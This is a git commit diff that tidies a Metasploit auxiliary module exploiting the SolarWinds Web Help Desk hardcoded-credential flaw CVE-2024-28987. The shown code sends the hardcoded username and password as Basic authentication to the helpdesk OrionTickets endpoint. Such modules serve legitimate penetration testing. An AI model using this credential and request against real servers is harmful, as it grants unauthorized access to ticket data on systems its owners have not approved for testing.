c34d20db686ac9c124bb8ddbfe49fe063c517de9
h4x-x0r <152236528+h4x-x0r@users.noreply.github.com>
2024-10-30 21:51:32 +0000

    updated
    updated

--- modules/auxiliary/gather/solarwinds_webhelpdesk_backdoor.rb
+++ modules/auxiliary/gather/solarwinds_webhelpdesk_backdoor.rb
@@ -22,7 +22,6 @@ class MetasploitModule < Msf::Auxiliary
           ['URL', 'https://www.solarwinds.com/trust-center/security-advisories/cve-2024-28987'],
           ['URL', 'https://support.solarwinds.com/SuccessCenter/s/article/SolarWinds-Web-Help-Desk-12-8-3-Hotfix-2'],
           ['URL', 'https://www.horizon3.ai/attack-research/cve-2024-28987-solarwinds-web-help-desk-hardcoded-credential-vulnerability-deep-dive/'],
-
         ],
         'DisclosureDate' => '2024-08-22',
         'DefaultOptions' => {
@@ -59,14 +58,13 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def auth
-    res = send_request_cgi(
+    send_request_cgi(
       'method' => 'GET',
       'uri' => normalize_uri(target_uri.path, 'helpdesk/WebObjects/Helpdesk.woa/ra/OrionTickets'),
       'headers' => {
         'Authorization' => 'Basic ' + Rex::Text.encode_base64('helpdeskIntegrationUser:dev-C4F8025E7')
       }
     )
-    res
   end
 
   def run
